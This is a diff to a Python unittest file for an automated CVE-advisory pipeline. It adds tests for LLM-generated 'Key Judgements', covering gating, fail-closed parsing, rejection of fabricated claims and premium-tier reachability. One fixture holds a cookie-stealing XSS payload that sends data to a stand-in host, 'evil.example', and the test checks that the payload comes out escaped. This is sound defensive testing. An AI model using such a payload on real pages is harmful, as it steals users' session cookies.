@@ -3,7 +3,9 @@
 import base64
 import html
 import json
+import os
 import re
+import tempfile
 import unittest
 from datetime import datetime, timezone
 from unittest.mock import patch
@@ -695,15 +697,17 @@ class TestAuthorityTransformerContract(unittest.TestCase):
         self.assertIn("product_tier_reason", result)
         self.assertIn("product_tier_mandatory_withheld", result)
         # _make_article()'s clean CVE evidence, composed (not LLM-authored)
-        # content: Key Judgements and Intelligence Gaps have no
-        # implementation anywhere in this pipeline (per report_contract.py),
-        # so they always resolve WITHHELD -- but that is only 2 of 14
-        # mandatory cve_advisory sections, capping this at TACTICAL, never
-        # FLASH and never PREMIUM_LONG_FORM. Matches the exhaustive real-data
-        # proof in the certification doc above (9/9 combinations -> TACTICAL).
+        # content: content_source isn't in LLM_AUTHORED_SOURCES, so Key
+        # Judgements generation is never attempted (RX-P1F's own gating --
+        # see authority_transformer.transform()) and Section 3 resolves
+        # WITHHELD, capping this at TACTICAL, never FLASH and never
+        # PREMIUM_LONG_FORM. Intelligence Gaps (Section 21) is no longer
+        # withheld as of RX-P1F -- pipeline_composer.compose_report()'s real
+        # (if minimal) gap list resolves it PARTIAL_EVIDENCE instead, so it
+        # no longer appears in mandatory_withheld.
         self.assertEqual(result["product_tier"], "TACTICAL")
         self.assertIn("key_judgements", result["product_tier_mandatory_withheld"])
-        self.assertIn("intelligence_gaps", result["product_tier_mandatory_withheld"])
+        self.assertNotIn("intelligence_gaps", result["product_tier_mandatory_withheld"])
 
     def test_evidence_graph_and_intelligence_gaps_are_wired_into_transform_output(self):
         # RX-P1C-WIRE / RX-P1E-WIRE: compose_report() already builds a real,
@@ -951,6 +955,155 @@ class TestSourceContentPromptInjectionResistance(unittest.TestCase):
         # content, i.e. the source text was interpolated into a template
         # rather than the entire prompt.
         self.assertGreater(prompt.index(malicious_summary), 0)
+
+
+class TestKeyJudgementsWiredIntoTransform(unittest.TestCase):
+    """RX-P1F end-to-end: proves Key Judgements actually reach the real
+    transform() call path -- generation, rendering, section-state gating,
+    and (the decisive proof) that PREMIUM_LONG_FORM is genuinely reachable
+    now, not merely that the isolated gate function can theoretically open."""
+
+    def setUp(self):
+        self.config = Config()
+        self.tmpdir = tempfile.mkdtemp()
+        self.config.state_file = os.path.join(self.tmpdir, "state.json")
+
+    def _write_prior_independent_post(self, cve_id: str):
+        with open(self.config.state_file, "w", encoding="utf-8") as f:
+            json.dump({"posts": {"prior-1": {
+                "cves": [cve_id], "source": "global_rss", "source_publisher": "BleepingComputer",
+                "source_url": "https://www.bleepingcomputer.com/news/security/prior-report/",
+                "published_at": "2026-08-01T00:00:00Z",
+            }}}, f)
+
+    def test_key_judgements_not_attempted_when_narrative_is_not_llm_authored(self):
+        # Efficiency/correctness gating: content_source="reportx_composer"
+        # is not in LLM_AUTHORED_SOURCES, so the second (Key Judgements)
+        # LLM call must never even be attempted -- asserted by making the
+        # mock raise if called at all.
+        def _must_not_be_called(*a, **k):
+            raise AssertionError("generate_key_judgements should not call the LLM here")
+
+        with patch("automation.key_judgements.call_llm", side_effect=_must_not_be_called):
+            result = AuthorityTransformer(self.config).transform(_make_article())
+        self.assertEqual(result["key_judgements"], [])
+        self.assertEqual(result["content_source"], "reportx_composer")
+
+    def test_key_judgements_generated_and_rendered_when_narrative_is_llm_authored(self):
+        realistic_kj_response = json.dumps([{
+            "judgement": "The absence of a public patch combined with a network-exploitable vector "
+                         "elevates near-term risk despite no confirmed in-the-wild activity.",
+            "confidence": "MEDIUM", "claim_refs": ["c-exploitation-status"],
+            "reasoning_basis": "Exploitation status is unconfirmed per the source record.",
+            "decision_relevance": "Prioritize patch testing ahead of general availability.",
+            "limitations": "Single-source record.",
+            "what_would_change_the_judgement": "A CISA KEV listing.",
+        }])
+        with patch(
+            "automation.authority_transformer.call_llm",
+            return_value=("<h3>Executive Summary</h3><p>Fluent LLM prose.</p>", "groq"),
+        ), patch(
+            "automation.key_judgements.call_llm",
+            return_value=(realistic_kj_response, "groq"),
+        ):
+            result = AuthorityTransformer(self.config).transform(_make_article())
+
+        self.assertEqual(len(result["key_judgements"]), 1)
+        self.assertEqual(result["key_judgements"][0]["confidence"], "MEDIUM")
+        self.assertIn("Key Judgements", result["content"])
+        self.assertIn("near-term risk", result["content"])
+
+    def test_malformed_key_judgement_response_fails_closed_without_breaking_publication(self):
+        with patch(
+            "automation.authority_transformer.call_llm",
+            return_value=("<h3>Executive Summary</h3><p>Fluent LLM prose.</p>", "groq"),
+        ), patch(
+            "automation.key_judgements.call_llm",
+            return_value=("not valid json {{{", "groq"),
+        ):
+            result = AuthorityTransformer(self.config).transform(_make_article())
+        self.assertEqual(result["key_judgements"], [])
+        self.assertEqual(result["key_judgement_rejections"], ["MALFORMED_JSON_RESPONSE"])
+        self.assertEqual(result["product_tier"], "TACTICAL")  # not broken, honestly capped
+
+    def test_fabricated_high_impact_key_judgement_is_rejected_not_published(self):
+        # Adversarial: a provider response asserting confirmed compromise
+        # with zero real claim support must never reach the public report.
+        fabricated = json.dumps([{
+            "judgement": "This system has been confirmed breached with data exfiltrated.",
+            "confidence": "HIGH", "claim_refs": [],
+        }])
+        with patch(
+            "automation.authority_transformer.call_llm",
+            return_value=("<h3>Executive Summary</h3><p>Fluent LLM prose.</p>", "groq"),
+        ), patch(
+            "automation.key_judgements.call_llm",
+            return_value=(fabricated, "groq"),
+        ):
+            result = AuthorityTransformer(self.config).transform(_make_article())
+        self.assertEqual(result["key_judgements"], [])
+        self.assertNotIn("confirmed breached", result["content"])
+        self.assertIn("UNSUPPORTED_HIGH_IMPACT_CLAIM", result["key_judgement_rejections"][0])
+
+    def test_premium_long_form_is_genuinely_reachable_end_to_end(self):
+        # THE decisive proof for RX-P1F: not a mocked section-state set
+        # (TestMechanismCanReachPremiumWhenConditionsAreGenuinelyMet in
+        # test_analytical_depth_gate.py already proved the gate isn't
+        # sealed shut by construction) -- this runs the REAL, unmocked
+        # transform() call path end to end and confirms a real article now
+        # actually reaches PREMIUM_LONG_FORM, for the first time since this
+        # gate was wired (Round 1: 9/9 real combinations resolved TACTICAL).
+        article = _make_article()  # cve_advisory family, clean CVSS/CWE/vendor/product
+        self._write_prior_independent_post(article.cve_id)
+        realistic_kj_response = json.dumps([{
+            "judgement": "Exploitation likelihood is elevated by the network attack vector despite no "
+                         "confirmed in-the-wild activity, warranting expedited patch testing.",
+            "confidence": "MEDIUM", "claim_refs": ["c-exploitation-status", "c-cve-id"],
+            "reasoning_basis": "CVE assignment confirmed; exploitation status unconfirmed per available evidence.",
+            "decision_relevance": "Expedite patch validation ahead of general availability.",
+            "limitations": "No independent technical analysis of exploit complexity performed.",
+            "what_would_change_the_judgement": "Public PoC code or a CISA KEV listing.",
+        }])
+        with patch(
+            "automation.authority_transformer.call_llm",
+            return_value=("<h3>Executive Summary</h3><p>Fluent LLM prose.</p>", "groq"),
+        ), patch(
+            "automation.key_judgements.call_llm",
+            return_value=(realistic_kj_response, "groq"),
+        ):
+            result = AuthorityTransformer(self.config).transform(article)
+
+        self.assertEqual(result["product_tier"], "PREMIUM_LONG_FORM", result["product_tier_reason"])
+        self.assertEqual(result["product_tier_mandatory_withheld"], [])
+        self.assertEqual(len(result["key_judgements"]), 1)
+        self.assertIn("Key Judgements", result["content"])
+        # Still passes every other gate -- premium status doesn't bypass
+        # certification, contradiction, or artifact-hash binding.
+        self.assertEqual(result["contradictions"], [])
+        self.assertTrue(result["certified_artifact_hash"])
+
+    def test_rendered_key_judgement_text_is_html_escaped(self):
+        # Adversarial: a provider response containing markup (whether from
+        # a compromised provider or a successful injection against a
+        # weaker one) must never reach the rendered page unescaped -- the
+        # same discipline TestLLMOutputSanitization enforces for the
+        # narrative body, applied here to _render_key_judgements_html().
+        xss_response = json.dumps([{
+            "judgement": "<script>fetch('https://evil.example/steal?c='+document.cookie)</script> "
+                         "Elevated risk given the network-exploitable vector.",
+            "confidence": "LOW", "claim_refs": ["c-exploitation-status"],
+        }])
+        with patch(
+            "automation.authority_transformer.call_llm",
+            return_value=("<h3>Executive Summary</h3><p>Fluent LLM prose.</p>", "groq"),
+        ), patch(
+            "automation.key_judgements.call_llm",
+            return_value=(xss_response, "groq"),
+        ):
+            result = AuthorityTransformer(self.config).transform(_make_article())
+        self.assertEqual(len(result["key_judgements"]), 1)
+        self.assertNotIn("<script>fetch", result["content"])
+        self.assertIn("&lt;script&gt;", result["content"])
 
 
 if __name__ == "__main__":
